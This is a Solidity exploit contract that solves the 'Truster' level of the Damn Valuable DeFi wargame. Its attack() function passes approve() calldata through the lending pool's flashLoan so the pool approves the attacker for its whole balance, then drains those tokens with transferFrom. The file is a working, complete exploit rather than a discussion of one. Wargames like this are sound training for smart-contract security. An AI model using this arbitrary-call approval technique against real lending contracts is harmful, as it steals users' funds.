// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

/**
 * @title AttackerTrusterLender
 * @author 
 */
contract AttackerTruster {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable trust;

    error RepayFailed();

    constructor(DamnValuableToken _token, TrusterLenderPool _trust) {
        token = _token;
        trust = _trust;
    }
    function attack() public{
        uint256 amount = token.balanceOf( address(trust));
        bytes memory data = abi.encodeWithSignature( 'approve(address,uint256)', address(this), amount);
        trust.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom( address(trust), msg.sender, amount);

    }

    // receive() payable external{

    // }
    fallback() external{
        
    }
}